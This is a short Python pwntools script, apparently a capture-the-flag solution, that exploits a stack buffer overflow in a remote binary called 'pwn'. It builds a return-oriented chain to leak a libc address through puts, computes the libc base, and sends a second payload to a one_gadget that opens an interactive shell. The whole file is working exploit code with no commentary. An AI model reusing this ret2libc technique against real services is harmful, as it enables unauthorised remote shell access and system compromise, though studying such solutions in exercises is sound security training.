from pwn import *

def exploit():
    # p = process("./pwn")
    p = remote("35.192.113.20", 31337)
    binary = ELF("pwn")
    puts_got = binary.got['puts']
    puts_plt = binary.plt['puts']
    main = binary.symbols['main']
    pop_rdi = 0x400723      # pop rdi ; ret
    padding = 0x88

    payload = ''
    payload += 'A' * padding
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)
    
    # gdb.attach(p, '''
    #                 break *0x4006b8
    #                 c
    #                 ''')

    p.sendlineafter("= ", payload)

    p.recvline()
    libc_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x0809c0
    log.info("Libc base : {}".format(hex(libc_base)))
    one_gadget = libc_base + 0x4f2c5
    log.info("One gadget addr : {}".format(hex(one_gadget)))

    payload = ''
    payload += 'A' * padding
    payload += p64(one_gadget)

    p.sendlineafter("= ", payload)
    p.interactive()

if __name__ == "__main__":
    exploit()